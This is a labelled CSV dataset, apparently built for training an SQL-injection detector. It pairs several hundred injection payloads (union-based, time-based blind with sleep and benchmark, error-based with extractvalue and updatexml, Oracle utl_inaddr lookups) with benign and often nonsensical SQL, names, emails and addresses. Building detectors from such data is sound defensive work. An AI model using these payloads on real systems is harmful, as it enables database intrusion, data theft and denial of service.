Query,Label
"1%' ) ) union all select null,null,null,null,null,null,null,null,null,null--",1
84411118z,0
SELECT major ( s ) FROM fat FULL OUTER JOIN,0
SELECT * FROM southern WHERE almost = 'broken' LIMIT 3,0
ob7491,0
"1' ) ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ( 'nets' like 'nets",1
0m24gu1l39,0
dcada,0
aminda,0
47965007w,0
"1'|| ( select 'mwmn' where 5112 = 5112 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) ||'",1
glazer,0
1' where 5060 = 5060,1
"select * from users where id = 1 union select @ 1$,version ( ) -- 1",1
"1' ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 'eflk' = 'eflk",1
1' where 7910 = 7910,1
stiller_kimball@socimi.com.ic,0
"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 4 ) ) AND 'i' = 'i",1
c4l6716o,0
laws cabezon,0
"1"" ) ) as ycvh where 4523 = 4523 and sleep ( 5 ) #",1
"""hi"""" ) or ( """"a"""" = """"a""",1
"1"" and make_set ( 8403 = 8403,8899 ) and ""bbgg"" = ""bbgg",1
SELECT * FROM over 3 SELECT * FROM product,0
SELECT foot ( s ) FROM example,0
"1%' or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and '%' = '",1
-3597' ) ) order by 1--,1
SELECT AVG ( Price ) FROM task,0
"1"" ) where 9295 = 9295 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1
vigoda5@fotoseroticas.com.ae,0
SELECT * FROM bottom WHERE smoke = 'mainly' AND ( breathe = 'darkness' OR store = 'forty' ),0
sedero,0
SELECT * FROM slip WHERE captured = 'locate' FETCH FIRST 3 ROWS ONLY,0
1' ) as xskm where 3525 = 3525 and 2435 = 6513,1
SELECT * FROM honor WHERE your BETWEEN '1996-07-01' AND '1996-07-31',0
1emat98,0
"1"" ) ) as fhlg where 1004 = 1004 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",1
"SELECT column_name ( s ) FROM unhappy,month",0
"1"" where 7371 = 7371 waitfor delay '0:0:5'--",1
"-7868"" union all select 1805--",1
"SELECT * FROM smoke WHERE organization BETWEEN ""its"" AND ""leave""",0
"SELECT appleID AS ID, symbol AS ride FROM stood",0
moretti alegre,0
SELECT AVG ( rocket ) FROM scientist SELECT SUM ( gently ),0
SELECT TOP 3 * FROM cloth WHERE people = 'officer',0
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( 'xcnj' = 'xcnj",1
"1"" ) where 7452 = 7452",1
laurencia,0
melucci,0
"SELECT ROUND ( 135.375, 2 ) ;",0
waitfor delay '0:0:5' and ( 'eaxu' = 'eaxu,1
"1,iif ( 6625 = 6625,1,1/0 )",1
if ( 2695 = 9045 ) select 2695 else drop function qmno--,1
SELECT * FROM lunch ORDER BY policeman DESC,0
"1"" ) where 1614 = 1614 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",1
"1"" and elt ( 4249 = 4249,7259 ) and ""kgtz"" like ""kgtz",1
"1' ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( 'ayjb' like 'ayjb",1
1 ) as sglv where 7676 = 7676,1
SELECT * FROM swept FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM pond,0
sfiroudi,0
select ( case when ( 1724 = 6528 ) then 1724 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1
SELECT TOP 50 PERCENT * FROM perfect SELECT * FROM observe FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM gulf,0
"-8436' ) as frmf where 7225 = 7225 or make_set ( 9354 = 9354,7185 ) --",1
select ( case when ( 7980 = 3703 ) then 7980 else 7980* ( select 7980 from information_schema.character_sets ) end ) #,1
SELECT MIN ( highest ) AS spread FROM require,0
#NAME?,0
1 ) where 6494 = 6494,1
"-5493"" ) ) union all select 8001,8001--",1
"1"" where 6023 = 6023",1
1' ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( 'ineq' like 'ineq,1
"1%"" union all select null,null,null,null,null,null,null,null#",1
SELECT * FROM character FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM planet,0
1 ) ) as qgma where 7675 = 7675 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1
"1"" ) as mohv where 2171 = 2171 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",1
"-1203"" ) ) or 8571 = 8571--",1
uhlhorn,0
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) -- ygbf",1
"SELECT COUNT ( whispered ) , immediately FROM word BY thousand",0
"1' ) as kgnd where 1550 = 1550 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
"SELECT * FROM replace WHERE subject IN ( 'managed', 'past', 'name' )",0
SELECT * FROM inch,0
"1%' ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( '%' = '",1
"1"" ) where 6809 = 6809 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --",1
-7037' ) ) as epsg where 3684 = 3684 union all select 3684--,1
proftica,0
"1' ) ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 'gmbd' = 'gmbd",1
SELECT thing ( s ) FROM exact LEFT JOIN,0
SELECT * FROM service ORDER BY connected,0
SELECT * FROM composed WHERE certain NOT LIKE '[discovery]%',0
SELECT * FROM notice WHERE exact BETWEEN '1996-07-01' AND '1996-07-31',0
"1 union all select null,null,null,null,null,null,null,null,null,null#",1
SELECT * FROM who WHERE pure BETWEEN round09/01/1996believed AND four15/31/1996build,0
z5r1174osa,0
1'+ ( select hrgu where 9587 = 9587,1
SELECT minerals ( s ) FROM folks LEFT JOIN,0
SELECT DISTINCT father FROM yard,0
"camino san jaime 97,",0
"1"" ) where 1833 = 1833",1
"SELECT weak, bound+ ', ' + vessels+ ' ' + cage+ ', ' + pole AS union FROM highway",0
SELECT * FROM ill WHERE people NOT BETWEEN 'health' AND 'discussion',0
"passeig picasso, 23,",0
-6529' ) or ( 4309 = 1601 ) *1601,1
"SELECT Customers.CustomerName, Orders.OrderIDFROM CustomersFULL OUTER JOIN OrdersON Customers.CustomerID = Orders.CustomerIDORDER BY Customers.CustomerName;",0
char%4039%41%2b%40SELECT,1
SELECT * FROM sit ORDER BY game,0
"-1585%"" ) ) union all select 8818,8818,8818,8818,8818,8818#",1
SELECT AVG ( smell ) FROM alive SELECT SUM ( subject ),0
whiteside.seyfferrtitz@cohel.uk,0
ad5ma.sc9r,0
32621,0
39sch6nz6da,0
"1"" ) as bpmk where 4506 = 4506",1
5642,0
"-4993"" union all select 6959,6959,6959--",1
"1"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""exgr"" like ""exgr",1
SELECT take ( s ) FROM helpful SELECT airplane FROM nest,0
"1%' ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"1"" ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( ""text"" like ""text",1
"SELECT column1 , column2, ... FROM table_name WHERE condition1 OR condition2 OR condition3 ... ;",0
"1', ( select ( case when ( 9644 = 9644 ) then dbms_pipe.receive_message ( chr ( 75 ) ||chr ( 78 ) ||chr ( 104 ) ||chr ( 98 ) ,5 ) else 1/ ( select 0 from dual ) end ) from dual )",1
1' ) ) and ( 3020 = 3020 ) *6703 and ( ( 'pfal' = 'pfal,1
"1"" ) where 4182 = 4182 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",1
natver,0
SELECT goose ( s ) FROM actual LEFT JOIN,0
SELECT * FROM strike WHERE fighting = 'accurate' AND City = 'exact',0
SELECT option_value FROM wp_options WHERE option_name = '_site_transient_timeout_wp_wps_bg_image_sync_1_process_lock' LIMIT 1,0
"1"" ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( ""fpkm"" like ""fpkm",1
"-9684"" order by 1#",1
"-3873%' ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1
2129,0
"1"" and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ""ouix"" = ""ouix",1
"-9638 ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( 3679 = 3679",1
SELECT * FROM final WHERE task BETWEEN '1996-07-01' AND '1996-07-31',0
#NAME?,0
-8465' where 5242 = 5242 or 3806 = 7423--,1
borrenes,0
"-5313' ) union all select 7187,7187,7187#",1
milou,0
"-3933' ) ) ) union all select 6198,6198,6198,6198,6198#",1
"-7258 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1
"-6554' ) ) ) union all select 4384,4384,4384,4384,4384#",1
SELECT TAN ( 1.75 ) ;,0
"1"" and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",1
wooland@indagacion.td,0
c356conio,0
1'+ ( select 'uetb' where 6468 = 6468,1
"1%' ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1
1%' ) ) order by 1#,1
name' OR '1'='1'--,1
SELECT * FROM ( SELECT stock FROM driven ),0
1 ) ) as sfan where 7176 = 7176 and 7017 = 7358,1
"-8758' union all select 6885,6885,6885,6885,6885,6885,6885,6885--",1
"SELECT Orders.smallrID, Employees.native, Employees.yourself FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.butID ORDER BY Orders.burstID",0
UPDATE lift SET try = 'thin'WHERE occur = 'season',0
"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",1
"-9606%"" ) ) ) union all select 8572,8572,8572,8572,8572,8572,8572,8572,8572--",1
"1 ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )",1
SELECT * FROM answer WHERE coffee = 'pool' AND City = 'fully',0
"-6170 ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1
"1, ( select ( case when ( 5217 = 5217 ) then 1 else 5217* ( select 5217 from mysql.db ) end ) )",1
"1"" and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",1
1' ) where 5287 = 5287 and 7533 = 7533--,1
SELECT * FROM car WHERE five = 'person' AND ( recently = 'yet' OR adult = 'second' ),0
"1%' ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( '%' = '",1
eulalio,0
serrtil,0
49130,0
SELECT * FROM laugh,0
"( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6130 = 6130,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",1
DELETE FROM sick,0
SELECT AVG ( relationship ) FROM fox,0
"1%' union all select null,null,null,null,null,null#",1
luczka graciot,0
"1"" ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1
"1' ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )",1
1' ) ) ) and 7533 = 7533 and ( ( ( 'txex' = 'txex,1
SELECT * FROM progress WHERE pilot = 'chain' AND ( mountain = 'involved' OR meal = 'went' ),0
"1' ) union all select null,null#",1
"SELECT Employees.society, COUNT ( Orders.orbitID ) AS freeFROM ( OrdersINNER JOIN quietly ON Orders.oneID = Employees.foughtID )",0
band@casadedurcal.bi,0
"1' ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( 'vkde' = 'vkde",1
SELECT TOP 3 * FROM wheat WHERE along = 'swept',0
select ( case when ( 1743 = 5698 ) then 1743 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1
SELECT * FROM silent WHERE cover IN ( SELECT bet FROM bet ),0
SELECT wp_posts.* FROM wp_posts WHERE 1 = 1 AND wp_posts.post_name IN ( 'front-page' ) AND ( 0 = 1 ) AND wp_posts.post_type = 'wp_template' AND ( ( wp_posts.post_status = 'publish' ) ) GROUP BY wp_posts.ID ORDER BY wp_posts.post_date DESC,0
SELECT * FROM repeat WHERE observe BETWEEN 'exact' AND 'boat',0
SELECT * FROM along WHERE shoulder BETWEEN strange09/01/1996strength AND cream15/31/1996hide,0
"INSERT INTO amount ( border, slide, north, egg, draw, stock ) VALUES ( 'atomic', 'heart'. language', 'baseball', 'weak', 'harbor', 'support' )",0
"1%"" ) ) ) union all select null#",1
SELECT * FROM vegetable WHERE purpose = 'canal' OR last = 'paint',0
"1"" ) where 2070 = 2070",1
1' and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and 'iuao' = 'iuao,1
"1"" ) ) order by 1#",1
"SELECT * FROM put WHERE copper BETWEEN ""according"" AND ""cream""",0
legrandv,0
"1%"" ) ) union all select null,null,null,null#",1
select ( case when ( 3565 = 4053 ) then 3565 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1
SELECT TOP 50 PERCENT * FROM hide SELECT * FROM game FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM stretch,0
-6453%' ) ) or ( 8459 = 8459 ) *4906 and ( ( '%' = ',1
"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ""uidb"" like ""uidb",1
villadecanes,0
SELECT TOP 3 * FROM suppose SELECT * FROM stairs 3SELECT * FROM sharp,0
4176,0
SELECT MIN ( low ) AS plate FROM teeth,0
"1%' ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( '%' = '",1
"-4670"" ) ) or 3038 = 3038",1
tardguila,0
"1"" where 3221 = 3221 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",1
1 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) -- ybmz,1
goudon,0
"calle robregordo, 171 10-c",0
SELECT * FROM judge WHERE rain = 'power' OR pull = 'month',0
"1' ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
-6190' ) where 2621 = 2621 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,1
SELECT TOP 3 * FROM arrow WHERE having = 'corn',0
"1' ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( 'ffzv' = 'ffzv",1
SELECT * FROM whistle WHERE strong IN ( SELECT who FROM mysterious ),0
SELECT * FROM tune WHERE capital BETWEEN 'guess' AND 'purple',0
SELECT AVG ( hospital ) FROM crop,0
darby,0
7310,0
SELECT * FROM caught WHERE balloon BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT MIN ( smile ) AS tree FROM alone,0
SELECT * FROM ( SELECT hand FROM wore ),0
"-3037"" ) ) ) or elt ( 4758 = 9129,9129 ) and ( ( ( ""zewv"" like ""zewv",1
"1' in boolean mode ) union all select null,null,null,null,null--",1
"-2962' ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'hkjo' = 'hkjo",1
"SELECT column_name ( s ) FROM cover,temperature",0
1 rlike ( select ( case when ( 6795 = 5898 ) then 1 else 0x28 end ) ) -- xdkx,1
SELECT MIN ( green ) AS eager FROM crowd,0
"-8734%"" ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ""%"" = """,1
"1"" ) ) as tjdz where 8656 = 8656 union all select null,null,null,null,null--",1
"1' ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 'dfsj' = 'dfsj",1
) or sleep ( __TIME__ ) = ',1
oreste,0
folsom_talli@esteticadayda.tel,0
SELECT Count ( * ) AS settle,0
"SELECT * FROM cotton WHERE bar NOT IN ( 'addition', 'off', 'page' )",0
SELECT * FROM apart WHERE composed = 'bicycle',0
"-6940' ) union all select 3042,3042,3042,3042,3042#",1
SELECT * FROM length WHERE sent = 'ten',0
"-2414%"" ) or elt ( 1032 = 1032,3623 ) and ( ""%"" = """,1
-1876%' ) union all select 6463--,1
SELECT * FROM collect WHERE please = 'lesson' FETCH FIRST 3 ROWS ONLY,0
21444030a,0
"1' in boolean mode ) and elt ( 1210 = 1210,sleep ( 5 ) ) #",1
select sleep ( 5 ) #,1
"-7689' union all select 8739,8739,8739,8739,8739,8739,8739,8739,8739,8739--",1
SELECT * FROM fog WHERE separate = able,0
revuelta borgua,0
1' ) as oknw where 8777 = 8777,1
"-4984%"" ) ) ) union all select 6980,6980,6980,6980,6980,6980,6980,6980#",1
"once septiembre, 95",0
8.77345E+15,0
"1'+ ( select jley where 3581 = 3581 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1
-4785' or ( 8459 = 8459 ) *4906 and 'esfn' = 'esfn,1
"1' ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 'tpcm' like 'tpcm",1
1.61637E+15,0
"-2167' ) ) ) union all select 3804,3804,3804,3804,3804,3804#",1
61089913g,0
"SELECT wrote, none, frequentlyFROM settle WHERE against IS NOT NULL",0
SELECT option_value FROM wp_options WHERE option_name = 'classic-editor-allow-users' LIMIT 1,0
"-9496 ) ) ) or elt ( 7511 = 3951,3951 ) and ( ( ( 3514 = 3514",1
casarabonela,0
"SELECT * FROM figure WHERE worker NOT IN ( 'how', 'eye', 'familiar' )",0
"1 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )",1
7uo09e5a1,0
"-5062"" ) ) ) union all select 4125,4125--",1
SELECT AVG ( however ) FROM nothing,0
SELECT * FROM pet WHERE piece NOT LIKE 'purpose%',0
vital,0
"SELECT * FROM visit WHERE toward BETWEEN ""flame"" AND ""sheet""",0
"SELECT * FROM threw ORDER BY stood, manner",0
SELECT * FROM consonant WHERE using LIKE '%book%',0
"1' and make_set ( 2942 = 8200,8200 ) and 'jnhv' like 'jnhv",1
"SELECT * FROM stand ORDER BY equipment, from",0
saturnina,0
bazo san salvador,0
sylvie@laspruebascongaseosa.pk,0
1 ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ),1
SELECT * FROM identity WHERE influence = 'taste' AND City = 'five',0
"1"" ) ) as ktue where 6392 = 6392 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
"1"" procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 )",1
"-1949 ) as smyn where 4066 = 4066 union all select 4066,4066--",1
barlovento,0
"1"" ) ) ) and sleep ( 5 ) #",1
69054908f,0
SELECT * FROM manufacturing FETCH FIRST 3 ROWS ONLY,0
SELECT COUNT ( firm ) FROM element,0
"1 and make_set ( 8403 = 8403,8899 )",1
SELECT behind ( s ) FROM last SELECT dawn ( s ),0
"peral, 180 4-b",0
SELECT base ( s ) FROM better UNION,0
-6473' union all select 7537#,1
2783,0
berrell@lingote.com.nf,0
poncin@todobetis.mil,0
"av. italia, 66, 4-a",0
SELECT * FROM whether WHERE ruler = 'trouble' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM occur FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM liquid,0
abuuelada,0
"-8824%' ) ) or make_set ( 9354 = 9354,7185 ) and ( ( '%' = '",1
SELECT wp_posts.* FROM wp_posts WHERE ID IN ( 367576 ),0
end and ( 'hmtt' like 'hmtt,1
"1%"" ) ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
SELECT sink ( s ) FROM purpose SELECT easy ( s ),0
69320452q,0
48c09a,0
69634179t,0
1'|| ( select 'nwve' where 7721 = 7721,1
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ""vcvb"" like ""vcvb",1
"SELECT quick,equator,child FROM press LEFT JOIN Orders ON increase.suggestID = master.village ORDER BY route.tent",0
"1"" and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) )",1
